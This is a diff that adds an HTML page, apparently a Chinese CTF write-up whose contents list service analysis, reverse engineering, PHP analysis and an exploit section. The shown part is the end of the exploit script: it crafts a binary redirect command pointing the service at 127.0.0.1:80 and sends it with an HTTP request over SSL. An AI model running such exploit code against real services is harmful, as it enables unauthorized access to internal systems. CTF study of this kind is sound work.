+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># is_ipv6
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">MAJOR_COMMAND_SET_REDIRECT_INFO</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    message = message.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) + </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    message += </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">127.0.0.1:80</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">sendall</span><span style="color:#c0c5ce;">(message)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">已发送数据: </span><span style="color:#c0c5ce;">{message}&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">input</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">paused</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># （可选）接收服务器响应
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">sendall</span><span style="color:#c0c5ce;">(request.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">input</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">ssl.SSLError </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">e:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">SSL 错误: </span><span style="color:#c0c5ce;">{e}&quot;)
+</span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">Exception </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">e:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">连接错误: </span><span style="color:#c0c5ce;">{e}&quot;)
+</span><span style="color:#b48ead;">finally</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    ssl_sock.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">连接已关闭。</span><span style="color:#c0c5ce;">&quot;)
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu-miao-shu">题目描述</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fu-wu-fen-xi">服务分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ni-xiang-fen-xi">逆向分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#jiao-hu">交互</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#phpfen-xi">php分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
